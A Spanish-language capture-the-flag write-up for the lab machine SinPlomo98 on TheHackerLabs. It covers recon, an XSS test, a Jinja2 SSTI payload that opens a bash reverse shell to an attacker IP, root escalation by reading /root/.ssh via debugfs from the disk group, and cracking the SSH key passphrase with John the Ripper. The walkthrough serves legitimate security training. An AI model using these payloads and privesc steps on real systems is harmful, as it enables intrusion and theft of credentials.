---
title: "SinPlomo98 - TheHackerLabs"
date: 2025-04-24
draft: false
slug: "THL-writeup-sinPlomo98"
excerpt: "Esta es una máquina algo compleja. Después de analizar los escaneos, descubrimos que hay dos páginas webs activas, una en el puerto 80 y otra en el puerto 5000. También vemos activo el puerto 21 del servicio FTP, siendo que podemos entrar como el usuario anonymous, pero solo encontramos un archivo de texto que no da ninguna pista. Analizando y aplicando Fuzzing a la página web del puerto 80, no encontramos algo útil. Analizando el código fuente de la página web del puerto 5000, encontramos un comentario que es un directorio web que, al visitarlo, vemos que nos permite enviar data en un input. Haciendo pruebas en el input, resulta que es vulnerable al ataque Server Side Template Injection. Esto último lo sabemos porque la página utiliza Werkzeug. Sabiendo y probando esto, aplicamos una Reverse Shell con la que ganamos acceso a la máquina. Dentro de la máquina y después de enumerarla, descubrimos que estamos dentro del grupo Disk, lo que nos permite entrar en una partición del disco del sistema. Ya en la partición, vemos que nos permite entrar en el directorio /root, siendo ahí donde encontramos la llave privada id_rsa, que copiamos y crackeamos para ganar acceso a la máquina víctima como Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "FTP", "Werkzeug", "FTP Enumeration", "Web Enumeration", "Fuzzing", "Server Side Template Injection (SSTI)", "System Recognition (Linux)", "Abusing Group Disk", "Cracking Hash", "Cracking SSH Private Key", "Privesc - Abusing Group Disk", "Privesc - Cracking SSH Private Key", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "nc"
  - "id"
  - "Python3"
  - "wget"
  - "linpeas.sh"
  - "tail"
  - "df"
  - "debugfs"
  - "cat"
  - "ssh2john"
  - "chmod"
  - "JohnTheRipper"
  - "ssh"
links:
  - "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html?highlight=SSTI#jinja2-ssti"
  - "https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"
  - "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=disk#disk-group"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-sinPlomo98/sinPlomo98.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.20
PING 192.168.10.20 (192.168.10.20) 56(84) bytes of data.
64 bytes from 192.168.10.20: icmp_seq=1 ttl=64 time=1.75 ms
64 bytes from 192.168.10.20: icmp_seq=2 ttl=64 time=1.10 ms
64 bytes from 192.168.10.20: icmp_seq=3 ttl=64 time=1.67 ms
64 bytes from 192.168.10.20: icmp_seq=4 ttl=64 time=0.818 ms

--- 192.168.10.20 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 0.818/1.335/1.754/0.389 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.20 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 12:09 CST
Initiating ARP Ping Scan at 12:09
Scanning 192.168.10.20 [1 port]
Completed ARP Ping Scan at 12:09, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:09
Scanning 192.168.10.20 [65535 ports]
Discovered open port 21/tcp on 192.168.10.20
Discovered open port 22/tcp on 192.168.10.20
Discovered open port 80/tcp on 192.168.10.20
Discovered open port 5000/tcp on 192.168.10.20
Completed SYN Stealth Scan at 12:09, 5.94s elapsed (65535 total ports)
Nmap scan report for 192.168.10.20
Host is up, received arp-response (0.00088s latency).
Scanned at 2025-04-24 12:09:45 CST for 6s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Me da curiosidad ver el **puerto 21** activo, y no sé de qué se trate el **puerto 5000**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80,5000 192.168.10.20 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 12:10 CST
Nmap scan report for 192.168.10.20
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              34 May 16  2024 supermegaultraimportantebro.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.10.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 f4:f1:61:c9:94:fe:27:41:8c:63:56:28:06:a1:12:5f (ECDSA)
|_  256 3c:13:58:8b:6b:5a:16:0b:69:aa:1e:3a:40:57:21:91 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Knight Bootstrap Template - Index
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.11.2)

|_http-title: \xC2\xA1Mi P\xC3\xA1gina Web!
|_http-server-header: Werkzeug/3.0.3 Python/3.11.2
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Tenemos bastante información.

Podemos entrar al **servicio FTP** del **puerto 21** con el **usuario anonymous**. Además, reporta que encontró un archivo de texto que podremos descargar y ver.

La página web del **puerto 80** nos reporta el uso de una plantilla de Bootstrap que quizá sea vulnerable a algo.

Y el **puerto 5000**, muestra otra página web que está utilizando **Werkzeug 3.0.3**. Esta página puede ser vulnerable a algunas cosillas que ya he explotado de **Werkzeug**, así que lo probaremos más adelante.

Empezaremos por el **servicio FTP**, luego por la página web del **puerto 80** y, por último, con la página web del **puerto 5000**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio FTP {#FTP}

Entremos:
```bash
ftp 192.168.10.20
Connected to 192.168.10.20.
220 (vsFTPd 3.0.3)
Name (192.168.10.20:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Veamos qué hay dentro:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||5078|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              34 May 16  2024 supermegaultraimportantebro.txt
226 Directory send OK.
```
En efecto, solo hay un archivo.

Descarguémoslo:
```bash
ftp> get supermegaultraimportantebro.txt
local: supermegaultraimportantebro.txt remote: supermegaultraimportantebro.txt
229 Entering Extended Passive Mode (|||56027|)
150 Opening BINARY mode data connection for supermegaultraimportantebro.txt (34 bytes).
100% |**************************************|    34       21.02 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (8.59 KiB/s)
ftp> exit
221 Goodbye.
```

Veamos qué contiene el archivo:
```bash
cat supermegaultraimportantebro.txt
Gracias por venir, ahora vayase!!
```
No pues nada útil.

Vayamos a ver la página web del **puerto 80**.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura1.png">
</p>

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura2.png">
</p>

Como tal, no veo algo que nos pueda ayudar.

Viendo un poco la página, lo único que puedo destacar es que aparecen usuarios:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura3.png">
</p>

De ahí en fuera, no veo nada más.

Apliquemos **Fuzzing** para ver si hay algo escondido por ahí.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt http://192.168.10.20/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.10.20/FUZZ
Total requests: 1185240

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000344:   301        9 L      28 W       316 Ch      "forms"                                                                                                                      
000001007:   301        9 L      28 W       321 Ch      "javascript"                                                                                                                 
000000273:   301        9 L      28 W       317 Ch      "assets"                                                                                                                     
000036871:   200        893 L    3005 W     41812 Ch    "http://192.168.10.20/"                                                                                                     
000102940:   403        9 L      28 W       279 Ch      "server-status"                                                                                                              

Total time: 0
Processed Requests: 1185240
Filtered Requests: 1185235
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.20/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.20/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://192.168.10.20/assets/]
/forms                (Status: 301) [Size: 316] [--> http://192.168.10.20/forms/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.10.20/javascript/]
/server-status        (Status: 403) [Size: 279]
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

No encontramos nada útil, entonces, vamos a revisar la página web del **puerto 5000**.

### Analizando Página Web del Puerto 5000 {#puertoExtra}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura4.png">
</p>

Solamente nos muestra una imagen.

Pero si revisamos el código fuente, nos muestra un comentario que es un directorio web:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura5.png">
</p>

Vamos a visitarlo:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura6.png">
</p>

Nos muestra solo un input.

Revisando el código fuente, se está enviando la data que escribamos como una **petición POST**, por lo que se interpreta lo que estemos mandando:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura7.png">
</p>

Podemos probar cosillas aquí.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Vulnerabilidades en Input {#vulns}

Metamos un dato random y enviémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura8.png">
</p>

Nos devuelve lo mismo.

Esta clase de inputs pueden ser vulnerables a **XSS**.

Tratemos de aplicar el clásico `alert()` de **Javascript** en el input:
```bash
# <script>alert('hackeado')</script>
```

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura9.png">
</p>

Y envíalo:

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura10.png">
</p>

Muy bien, funcionó y nos muestra la alerta.

Esto me da a entender que, no se está aplicando ninguna sanitización y está interpretando todo lo que mandemos.

### Aplicando Server Site Template Injection para Obtener Reverse Shell {#SSTI}

Algo que debemos tomar en cuenta, es la tecnología que está utilizando, siendo **Werkzeug**.

**Werkzeug** trabaja con **Flask**, que a su vez, puede trabajar con el **motor de plantillas Jinja2**, siendo este último vulnerable al **ataque Server Side Template Injection**.

| **Server Side Template Injection (SSTI)** |
|:-----------:|
| *Es una vulnerabilidad que ocurre cuando un atacante puede inyectar código en una plantilla del lado del servidor y ese código se evalúa/interpreta en el servidor, permitiéndole ejecutar instrucciones no autorizadas.* |

Aquí te dejo un par de blogs que muestran payloads para probar y explotar esta vulnerabilidad:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: jinja2</a>
* <a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank">Flask Jinja2 Pentesting</a>

Vamos a probar si ejecuta una multiplicación como dice el blog.

Prueba esto en el input:

{% raw %}
```bash
{{ 4*2 }}
```
{% endraw %}

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura11.png">
</p>

Funciona, se ejecuta la multiplicación.

Vamos a probar si podemos ejecutar comandos, así que tratemos de ejecutar **id**.

Prueba esto en el input:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura12.png">
</p>

Excelente, podemos ejecutar comandos.

Entonces, podemos ejecutar una **Reverse Shell**. 

Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Prueba esta **Reverse Shell** y ejecútala:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'").read() }}
```
{% endraw %}

Observa la **netcat**
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.20] 59900
bash: no se puede establecer el grupo de proceso de terminal (469): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
tcuser@SinPLomo98:~/prueba$ whoami
whoami
tcuser
```
Genial, estamos dentro.

Ya solo falta tener una shell interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z
stty raw -echo; fg

# Paso 3:
reset -> xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Y listo.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima {#linEnum}

Revisando en dónde estamos, encontraremos el script **app.py**, siendo este el que nos permitirá aplicar la vulnerabilidad **SSTI**:
```bash
tcuser@SinPLomo98:~/prueba$ ls
app.py  bin  include  lib  lib64  __pycache__  pyvenv.cfg  start_flask.sh  static  templates
tcuser@SinPLomo98:~/prueba$ cat app.py 
from flask import Flask, render_template, render_template_string, request

app = Flask(__name__)

# Página de inicio
@app.route('/')
def index():
    return render_template('index.html')

# Ruta vulnerable a SSTI
@app.route('/petrolhead', methods=['GET', 'POST'])
def vulnerable():
    if request.method == 'POST':
        # Obtener el texto enviado por el usuario desde el formulario
        user_input = request.form['user_input']
        
        # Renderizar la plantilla utilizando el texto del usuario
        return render_template_string(user_input)
    
    # Si es una solicitud GET, simplemente muestra el formulario
    return render_template('petrolhead.html')

if __name__ == '__main__':
    app.run(host='192.168.1.37', port=5000, debug=True)
```

Moviendonos al directorio `/home`, encontramos el directorio de este usuario y ahí estará la flag, pero no podremos verla porque le pertenece al **Root**:
```bash
tcuser@SinPLomo98:~/prueba$ cd /home/tcuser/
tcuser@SinPLomo98:~$ ls -la
total 44
drwx------ 4 tcuser tcuser 4096 may 16  2024 .
drwxr-xr-x 3 root   root   4096 may 15  2024 ..
-rw------- 1 tcuser tcuser  474 may 16  2024 .bash_history
-rw-r--r-- 1 tcuser tcuser  220 may 15  2024 .bash_logout
-rw-r--r-- 1 tcuser tcuser 3526 may 15  2024 .bashrc
-rw------- 1 tcuser tcuser   20 may 16  2024 .lesshst
drwxr-xr-x 3 tcuser tcuser 4096 may 16  2024 .local
-rw-r--r-- 1 tcuser tcuser  807 may 15  2024 .profile
drwxr-xr-x 8 tcuser tcuser 4096 may 16  2024 prueba
-rwxr-xr-x 1 root   root    128 may 16  2024 start_flask.sh
-r-------- 1 root   root     33 may 16  2024 user.txt
```
Si te das cuenta, el historial de comandos de Bash no se elimina.

Si lo revisamos, no encontraremos mucho, a excepción de unos comandos interesantes:
```bash
tcuser@SinPLomo98:~$ cat .bash_history | tail -n 17
id
df -h
debugfs /dev/sda1
clear
su root
2345
clsu root
su root
2345
su root
2345
/bin/bash -i
exit
sudo -l
exit
id
exit
```
Parece que se usó el comando `df -h` y luego entró en la partición `/dev/sda1` con el comando **debugfs**, que parece ser una partición del disco del sistema de la **máquina Linux**.

Justo eso nos indica que estamos en el **grupo Disk** y lo podemos comprobar con el comando **id**:
```bash
tcuser@SinPLomo98:~$ id
uid=1000(tcuser) gid=1000(tcuser) grupos=1000(tcuser),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

Y si usamos **linPEAS**, nos indicará que estar en este grupo es una vulnerabilidad crítica:
```bash
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(tcuser) gid=1000(tcuser) grupos=1000(tcuser),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```
Ya sabemos como escalar privilegios.

### Escalando Privilegios con el Grupo Disk {#Disk}

El mismo **linPEAS** nos da un link de referencia para encontrar una forma de escalar privilegios:
* <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=disk#disk-group" target="_blank">HackTricks: Disk Group Privesc</a>

Vamos a aplicar todo este proceso para ver si encontramos una forma de convertirnos en **Root**.

Primero, veamos el contenido del disco con `df -h`:
```bash
tcuser@SinPLomo98:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
udev             1,9G      0  1,9G   0% /dev
tmpfs            382M   532K  382M   1% /run
/dev/sda1         19G   3,1G   15G  18% /
tmpfs            1,9G      0  1,9G   0% /dev/shm
tmpfs            5,0M      0  5,0M   0% /run/lock
```
Ahí podemos ver la partición a la que entro este usuario.

Entremos en ella:
```bash
tcuser@SinPLomo98:~$ debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:
```

Veamos el contenido de esta partición:
```bash
debugfs:  ls -l
```

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura15.png">
</p>

Excelente, parece ser una partición de todo el sistema.

De aquí, nos podemos mover al directorio `/root` y ver su contenido:
```bash
debugfs:  cd /root
debugfs:  ls -l
```

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura13.png">
</p>

Genial, vemos el contenido del directorio y ahí está el directorio oculto `.ssh`.

Veamos si existen **llaves del SSH**:
```bash
debugfs:  ls -l .ssh
```

<p align="center">
<img src="/assets/images/THL-writeup-sinPlomo98/Captura14.png">
</p>

Ahí están las llaves y podemos ver la **llave privada id_rsa**.

Veamos su contenido:
```bash
debugfs:  cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCTkrWdzR
O/rgbxJO5rgjDoAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQCT0o/N70Qo
/KnWIFpRA64iNIWMAdaKm7VQm5TweGE6nWBXTLdPAPI3T5ehoI6odBywxIIHCTu/zhHcuJ
e4aHMT/5Qb1lJcsCErwmFveA1/1qyby+K46P1i/LrWIL2...
...
```

Bien, copiémoslo en nuestra máquina y, de una vez, vamos a darle los permisos necesarios para usarla más adelante:
```bash
chmod 600 id_rsa
```
Ahora, tratemos de crackearla.

#### Crackeando Llave Privada SSH y Logueandonos como Root {#cracking}

Una vez que hayas copiado la llave privada, tenemos que convertirla en un hash para que **JohnTheRipper** lo pueda crackear.

Lo haremos con la herramienta **ssh2john**:
```bash
ssh2john id_rsa > hash
```

Y usemos **JohnTheRipper** junto al **rockyou.txt** para crackearlo:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
angels1          (id_rsa)     
1g 0:00:01:22 DONE (2025-04-24 16:40) 0.01207g/s 33.03p/s 33.03c/s 33.03C/s my3kids..outlaw
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Muy bien, tenemos la frase de la llave privada.

Vamos a loguearnos en la máquina víctima como **Root** al **servicio SSH**, usando la llave privada y la frase:
```bash
ssh -i id_rsa root@192.168.10.20
Enter passphrase for key 'id_rsa': 
Linux SinPLomo98 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
Last login: Thu May 16 16:49:15 2024
root@SinPLomo98:~# whoami
root
```
Estamos dentro.

Ya solo tenemos que buscar las flags:
```bash
root@SinPLomo98:~# cat root.txt 
...
root@SinPLomo98:~# cat /home/tcuser/user.txt
...
```
Y con esto, completamos la máquina.
